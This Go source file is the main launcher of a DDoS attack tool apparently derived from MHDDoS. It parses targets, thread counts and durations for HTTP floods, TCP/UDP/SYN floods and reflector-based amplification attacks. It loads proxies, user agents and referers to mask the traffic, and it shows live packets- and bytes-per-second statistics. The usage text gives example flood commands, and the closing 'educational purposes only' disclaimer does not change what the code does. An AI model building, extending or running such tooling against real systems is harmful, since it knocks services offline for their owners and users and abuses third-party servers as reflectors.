package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/go-ddos-tools/pkg/attacks"
	"github.com/go-ddos-tools/pkg/config"
	"github.com/go-ddos-tools/pkg/methods"
	"github.com/go-ddos-tools/pkg/proxy"
	"github.com/go-ddos-tools/pkg/tools"
	"github.com/go-ddos-tools/pkg/ui"
	"github.com/go-ddos-tools/pkg/utils"
)

const version = "2.5"

var (
	requestsSent  = utils.NewCounter()
	bytesSent     = utils.NewCounter()
	totalRequests = utils.NewCounter()
	totalBytes    = utils.NewCounter()
	attackStarted time.Time
)

func main() {
	defer func() {
		if r := recover(); r != nil {
			ui.PrintError("Unexpected error: %v", r)
		}
	}()

	// Setup signal handling
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	if len(os.Args) < 2 {
		printBanner()
		printUsage()
		return
	}

	command := strings.ToUpper(os.Args[1])

	switch command {
	case "HELP", "-H", "--HELP":
		printBanner()
		printUsage()
	case "TOOLS":
		printBanner()
		tools.RunConsole()
	case "STOP":
		tools.StopAllAttacks()
	case "VERSION", "-V", "--VERSION":
		printBanner()
	case "METHODS":
		printBanner()
		printMethods()
	default:
		if err := runAttack(); err != nil {
			ui.PrintError("%v", err)
			fmt.Println()
			printUsageHint()
			os.Exit(1)
		}
	}
}

func runAttack() error {
	if len(os.Args) < 3 {
		return fmt.Errorf("insufficient arguments. Expected: <method> <target> [options...]")
	}

	method := strings.ToUpper(os.Args[1])
	target := os.Args[2]

	// Load configuration
	cfg, err := config.LoadConfig("config.json")
	if err != nil {
		ui.PrintWarning("Could not load config.json, using defaults: %v", err)
		cfg = &config.Config{
			MCBot:             "MHDDoS_",
			MinecraftProtocol: 47,
		}
	}

	// Normalize target URL
	if !strings.HasPrefix(target, "http") && !strings.Contains(target, ":") {
		target = "http://" + target
	}

	// Check if method is valid
	if !methods.IsValidMethod(method) {
		suggestions := ui.SuggestMethod(method, methods.AllMethods)
		errMsg := fmt.Sprintf("invalid method: %s", method)
		if len(suggestions) > 0 {
			errMsg += fmt.Sprintf("\n  Did you mean: %s?", strings.Join(suggestions, ", "))
		}
		return fmt.Errorf("%s", errMsg)
	}

	var wg sync.WaitGroup
	stopChan := make(chan struct{})

	// Setup signal handling for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	if methods.IsLayer7Method(method) {
		return runLayer7Attack(method, target, cfg, &wg, stopChan, sigChan)
	} else if methods.IsLayer4Method(method) {
		return runLayer4Attack(method, target, cfg, &wg, stopChan, sigChan)
	}

	return fmt.Errorf("unknown method type: %s", method)
}

func runLayer7Attack(method, target string, cfg *config.Config, wg *sync.WaitGroup, stopChan chan struct{}, sigChan chan os.Signal) error {
	if len(os.Args) < 8 {
		return fmt.Errorf("insufficient arguments for Layer7 attack.\n\n  Usage: %s %s <url> <socks_type> <threads> <proxylist> <rpc> <duration>\n\n  Example: %s %s http://example.com 5 100 proxies.txt 100 60",
			os.Args[0], method, os.Args[0], method)
	}

	proxyType, err := strconv.Atoi(os.Args[3])
	if err != nil {
		return fmt.Errorf("invalid proxy type '%s': must be a number (0=all, 1=HTTP, 4=SOCKS4, 5=SOCKS5)", os.Args[3])
	}

	// Validate proxy type
	result := ui.ValidateProxyType(proxyType)
	if !result.Valid {
		return fmt.Errorf("%s", ui.FormatValidationError(result, "proxy type"))
	}

	threads, err := strconv.Atoi(os.Args[4])
	if err != nil {
		return fmt.Errorf("invalid thread count '%s': must be a positive number", os.Args[4])
	}

	// Validate threads
	result = ui.ValidateThreads(threads)
	if !result.Valid {
		return fmt.Errorf("%s", ui.FormatValidationError(result, "thread count"))
	}
	if result.Hint != "" && result.Valid {
		ui.PrintWarning("%s", result.Hint)
	}

	proxyFile := os.Args[5]
	rpc, err := strconv.Atoi(os.Args[6])
	if err != nil {
		return fmt.Errorf("invalid RPC '%s': must be a positive number", os.Args[6])
	}

	// Validate RPC
	result = ui.ValidateRPC(rpc)
	if !result.Valid {
		return fmt.Errorf("%s", ui.FormatValidationError(result, "RPC"))
	}
	if result.Hint != "" && result.Valid {
		ui.PrintWarning("%s", result.Hint)
	}

	duration, err := strconv.Atoi(os.Args[7])
	if err != nil {
		return fmt.Errorf("invalid duration '%s': must be a positive number (in seconds)", os.Args[7])
	}

	// Validate duration
	result = ui.ValidateDuration(duration)
	if !result.Valid {
		return fmt.Errorf("%s", ui.FormatValidationError(result, "duration"))
	}
	if result.Hint != "" && result.Valid {
		ui.PrintWarning("%s", result.Hint)
	}

	// Load user agents and referers from files (matching Python behavior)
	// These are checked BEFORE proxies to fail fast if files are missing
	useragentPath := filepath.Join("files", "useragent.txt")
	referersPath := filepath.Join("files", "referers.txt")

	// Load user agents
	userAgents, err := utils.LoadRequiredFile(useragentPath, "user agent")
	if err != nil {
		return err
	}
	ui.PrintSuccess("Loaded %d user agents from %s", len(userAgents), useragentPath)

	// Load referers
	referers, err := utils.LoadRequiredFile(referersPath, "referer")
	if err != nil {
		return err
	}
	ui.PrintSuccess("Loaded %d referers from %s", len(referers), referersPath)

	// Load or download proxies
	var proxies []proxy.Proxy
	if proxyFile != "" {
		proxyPath := filepath.Join("files", "proxies", proxyFile)
		var err error
		proxies, err = proxy.LoadOrDownloadProxies(proxyPath, proxyType, cfg, target, threads)
		if err != nil {
			ui.PrintWarning("Error loading proxies: %v", err)
			ui.PrintInfo("Continuing without proxies")
		}
		if len(proxies) == 0 {
			ui.PrintWarning("No proxies loaded from '%s', continuing without proxies", proxyPath)
		} else {
			ui.PrintSuccess("Loaded %d proxies", len(proxies))
		}
	}

	printAttackBanner(method, target, threads, duration, "Layer7")

	// Create attack configuration
	attackCfg := &attacks.Layer7Config{
		Method:     method,
		Target:     target,
		Threads:    threads,
		RPC:        rpc,
		Duration:   duration,
		Proxies:    proxies,
		UserAgents: userAgents,
		Referers:   referers,
	}

	attackStarted = time.Now()

	// Start attack
	go func() {
		attacks.RunLayer7Attack(attackCfg, wg, stopChan, requestsSent, bytesSent)
	}()

	// Monitor attack
	monitorAttack(duration, method, target, stopChan, sigChan)

	wg.Wait()
	printAttackSummary(method, target)
	return nil
}

func runLayer4Attack(method, target string, cfg *config.Config, wg *sync.WaitGroup, stopChan chan struct{}, sigChan chan os.Signal) error {
	if len(os.Args) < 5 {
		return fmt.Errorf("insufficient arguments for Layer4 attack.\n\n  Usage: %s %s <ip:port> <threads> <duration>\n\n  Example: %s %s 192.168.1.1:80 100 60",
			os.Args[0], method, os.Args[0], method)
	}

	threads, err := strconv.Atoi(os.Args[3])
	if err != nil {
		return fmt.Errorf("invalid thread count '%s': must be a positive number", os.Args[3])
	}

	// Validate threads
	result := ui.ValidateThreads(threads)
	if !result.Valid {
		return fmt.Errorf("%s", ui.FormatValidationError(result, "thread count"))
	}
	if result.Hint != "" && result.Valid {
		ui.PrintWarning("%s", result.Hint)
	}

	duration, err := strconv.Atoi(os.Args[4])
	if err != nil {
		return fmt.Errorf("invalid duration '%s': must be a positive number (in seconds)", os.Args[4])
	}

	// Validate duration
	result = ui.ValidateDuration(duration)
	if !result.Valid {
		return fmt.Errorf("%s", ui.FormatValidationError(result, "duration"))
	}
	if result.Hint != "" && result.Valid {
		ui.PrintWarning("%s", result.Hint)
	}

	// Parse target (host:port)
	var host string
	var port int
	if strings.Contains(target, "://") {
		// Remove protocol
		parts := strings.Split(target, "://")
		if len(parts) > 1 {
			target = parts[1]
		}
	}

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		host = parts[0]
		port, err = strconv.Atoi(parts[1])
		if err != nil {
			return fmt.Errorf("invalid port '%s': must be a number between 1-65535", parts[1])
		}
		if port < 1 || port > 65535 {
			return fmt.Errorf("port %d is out of range (must be 1-65535)", port)
		}
	} else {
		host = target
		port = 80
		ui.PrintInfo("No port specified, using default port 80")
	}

	// Resolve hostname
	ui.PrintInfo("Resolving hostname %s...", host)
	ips, err := net.LookupIP(host)
	if err != nil {
		return fmt.Errorf("cannot resolve hostname '%s': %w\n  Hint: Check your network connection or verify the hostname is correct", host, err)
	}
	host = ips[0].String()
	ui.PrintSuccess("Resolved to %s", host)

	var proxies []proxy.Proxy
	var reflectors []string

	// Check for additional arguments (proxies or reflectors)
	if len(os.Args) >= 7 {
		arg5 := os.Args[5]
		if methods.IsAmplificationMethod(method) {
			// Load reflectors
			reflectorFile := filepath.Join("files", arg5)
			reflectors, _ = utils.LoadLines(reflectorFile)
			if len(reflectors) == 0 {
				ui.PrintWarning("No reflectors loaded from '%s'", reflectorFile)
			} else {
				ui.PrintSuccess("Loaded %d reflectors", len(reflectors))
			}
		} else if arg5Num, err := strconv.Atoi(arg5); err == nil {
			// Load or download proxies
			proxyFile := os.Args[6]
			proxyPath := filepath.Join("files", "proxies", proxyFile)
			targetURL := fmt.Sprintf("%s:%d", host, port)
			proxies, err = proxy.LoadOrDownloadProxies(proxyPath, arg5Num, cfg, targetURL, threads)
			if err != nil {
				ui.PrintWarning("Error loading proxies: %v", err)
				ui.PrintInfo("Continuing without proxies")
			}
			if len(proxies) == 0 {
				ui.PrintWarning("No proxies loaded from '%s'", proxyPath)
			} else {
				ui.PrintSuccess("Loaded %d proxies", len(proxies))
			}
		}
	}

	printAttackBanner(method, fmt.Sprintf("%s:%d", host, port), threads, duration, "Layer4")

	// Create attack configuration
	attackCfg := &attacks.Layer4Config{
		Method:     method,
		Host:       host,
		Port:       port,
		Threads:    threads,
		Duration:   duration,
		Proxies:    proxies,
		Reflectors: reflectors,
		ProtocolID: cfg.MinecraftProtocol,
	}

	attackStarted = time.Now()

	// Start attack
	go func() {
		attacks.RunLayer4Attack(attackCfg, wg, stopChan, requestsSent, bytesSent)
	}()

	// Monitor attack
	targetStr := fmt.Sprintf("%s:%d", host, port)
	monitorAttack(duration, method, targetStr, stopChan, sigChan)

	wg.Wait()
	printAttackSummary(method, targetStr)
	return nil
}

func monitorAttack(duration int, method, target string, stopChan chan struct{}, sigChan chan os.Signal) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	startTime := time.Now()
	endTime := startTime.Add(time.Duration(duration) * time.Second)

	fmt.Println()

	for {
		select {
		case <-sigChan:
			log.Println("\nAttack stopped by user")
			close(stopChan)
			return
		case <-ticker.C:
			if time.Now().After(endTime) {
				fmt.Println()
				ui.PrintSuccess("Attack duration completed")
				close(stopChan)
				return
			}

			elapsed := time.Since(startTime).Seconds()
			progress := (elapsed / float64(duration)) * 100

			reqs := requestsSent.Get()
			bytes := bytesSent.Get()

			// Accumulate total
			totalRequests.Add(reqs)
			totalBytes.Add(bytes)

			// Clear line and print status
			ui.ClearLine()
			fmt.Printf("  %s Target: %s | Method: %s | PPS: %s | BPS: %s %s",
				ui.Spinner(int(elapsed)),
				ui.FormatTarget(target),
				ui.FormatMethod(method),
				ui.FormatNumber(utils.HumanFormat(reqs)),
				ui.FormatNumber(utils.HumanBytes(bytes)),
				ui.ProgressBar(progress, 20))

			requestsSent.Set(0)
			bytesSent.Set(0)
		}
	}
}

func printBanner() {
	fmt.Print(ui.Banner(version))
}

func printAttackSummary(method, target string) {
	duration := time.Since(attackStarted)

	fmt.Println()
	fmt.Println()
	fmt.Println(ui.Header("  Attack Summary"))
	fmt.Println(ui.Info("  ─────────────────────────────────────"))
	fmt.Printf("  Method:          %s\n", ui.FormatMethod(method))
	fmt.Printf("  Target:          %s\n", ui.FormatTarget(target))
	fmt.Printf("  Duration:        %s\n", ui.FormatNumber(duration.Round(time.Second).String()))
	fmt.Printf("  Total Requests:  %s\n", ui.FormatNumber(utils.HumanFormat(totalRequests.Get())))
	fmt.Printf("  Total Data Sent: %s\n", ui.FormatNumber(utils.HumanBytes(totalBytes.Get())))

	if duration.Seconds() > 0 {
		avgRPS := float64(totalRequests.Get()) / duration.Seconds()
		avgBPS := float64(totalBytes.Get()) / duration.Seconds()
		fmt.Printf("  Avg. RPS:        %s\n", ui.FormatNumber(utils.HumanFormat(int64(avgRPS))))
		fmt.Printf("  Avg. BPS:        %s\n", ui.FormatNumber(utils.HumanBytes(int64(avgBPS))))
	}

	fmt.Println(ui.Info("  ─────────────────────────────────────"))
	fmt.Println()
}

func printUsageHint() {
	fmt.Printf("Run '%s help' for usage information.\n", os.Args[0])
}

func printMethods() {
	fmt.Println()
	fmt.Println(ui.Header("Available Attack Methods"))
	fmt.Println()

	fmt.Printf("%s (%d methods):\n", ui.Title("Layer 7 (HTTP/HTTPS)"), len(methods.Layer7Methods))
	for i, m := range methods.Layer7Methods {
		if i > 0 && i%8 == 0 {
			fmt.Println()
		}
		fmt.Printf("  %s", ui.FormatMethod(m))
	}
	fmt.Println()
	fmt.Println()

	fmt.Printf("%s (%d methods):\n", ui.Title("Layer 4 (TCP/UDP)"), len(methods.Layer4Methods))
	for i, m := range methods.Layer4Methods {
		if i > 0 && i%8 == 0 {
			fmt.Println()
		}
		fmt.Printf("  %s", ui.FormatMethod(m))
	}
	fmt.Println()
	fmt.Println()

	fmt.Printf("%s (%d methods):\n", ui.Title("Amplification"), len(methods.AmplificationMethods))
	for _, m := range methods.AmplificationMethods {
		fmt.Printf("  %s", ui.FormatMethod(m))
	}
	fmt.Println()
	fmt.Println()
}

func printAttackBanner(method, target string, threads, duration int, layer string) {
	fmt.Println()
	fmt.Println(ui.Header("  Attack Configuration"))
	fmt.Println(ui.Info("  ─────────────────────────────────────"))
	fmt.Printf("  Method:   %s\n", ui.FormatMethod(method))
	fmt.Printf("  Target:   %s\n", ui.FormatTarget(target))
	fmt.Printf("  Layer:    %s\n", ui.Info(layer))
	fmt.Printf("  Threads:  %s\n", ui.FormatNumber(fmt.Sprintf("%d", threads)))
	fmt.Printf("  Duration: %s\n", ui.FormatNumber(fmt.Sprintf("%d seconds", duration)))
	fmt.Println(ui.Info("  ─────────────────────────────────────"))
	fmt.Println()
	ui.PrintInfo("Attack started at %s", time.Now().Format("15:04:05"))
	ui.PrintInfo("Press Ctrl+C to stop the attack")
}

func printUsage() {
	fmt.Println()
	fmt.Println(ui.Header("Usage:"))
	fmt.Println()

	fmt.Println(ui.Title("  Layer 7 Attack:"))
	fmt.Printf("    %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>\n\n", os.Args[0])

	fmt.Println(ui.Title("  Layer 4 Attack:"))
	fmt.Printf("    %s <method> <ip:port> <threads> <duration>\n\n", os.Args[0])

	fmt.Println(ui.Title("  Layer 4 with Proxies:"))
	fmt.Printf("    %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist>\n\n", os.Args[0])

	fmt.Println(ui.Title("  Amplification Attack:"))
	fmt.Printf("    %s <method> <ip:port> <threads> <duration> <reflector_file>\n\n", os.Args[0])

	fmt.Println(ui.Header("Commands:"))
	fmt.Println()
	fmt.Printf("  %s    Show this help message\n", ui.Highlight("help"))
	fmt.Printf("  %s   Run interactive tools console\n", ui.Highlight("tools"))
	fmt.Printf("  %s    Stop all running attacks\n", ui.Highlight("stop"))
	fmt.Printf("  %s Show available attack methods\n", ui.Highlight("methods"))
	fmt.Printf("  %s Show version information\n", ui.Highlight("version"))
	fmt.Println()

	fmt.Println(ui.Header("Available Methods:"))
	fmt.Println()
	fmt.Printf("  %s (%d): %s\n", ui.Title("Layer 7"), len(methods.Layer7Methods), strings.Join(methods.Layer7Methods[:min(8, len(methods.Layer7Methods))], ", ")+"...")
	fmt.Printf("  %s (%d): %s\n", ui.Title("Layer 4"), len(methods.Layer4Methods), strings.Join(methods.Layer4Methods[:min(8, len(methods.Layer4Methods))], ", ")+"...")
	fmt.Printf("  %s (%d): %s\n", ui.Title("Amplification"), len(methods.AmplificationMethods), strings.Join(methods.AmplificationMethods, ", "))
	fmt.Println()

	fmt.Println(ui.Header("Examples:"))
	fmt.Println()
	fmt.Printf("  # Layer 7 GET attack with SOCKS5 proxies\n")
	fmt.Printf("  %s GET http://example.com 5 100 proxies.txt 100 60\n\n", os.Args[0])

	fmt.Printf("  # Layer 4 UDP flood\n")
	fmt.Printf("  %s UDP 192.168.1.1:80 100 60\n\n", os.Args[0])

	fmt.Printf("  # Layer 4 TCP SYN flood\n")
	fmt.Printf("  %s SYN 192.168.1.1:80 100 60\n\n", os.Args[0])

	fmt.Println(ui.Header("Proxy Types:"))
	fmt.Println()
	fmt.Printf("  %s - HTTP proxy\n", ui.FormatNumber("1"))
	fmt.Printf("  %s - SOCKS4 proxy\n", ui.FormatNumber("4"))
	fmt.Printf("  %s - SOCKS5 proxy\n", ui.FormatNumber("5"))
	fmt.Println()

	fmt.Println(ui.Warning("Disclaimer: This tool is for educational purposes only."))
	fmt.Println(ui.Warning("Do not attack websites without the owner's permission."))
	fmt.Println()
}
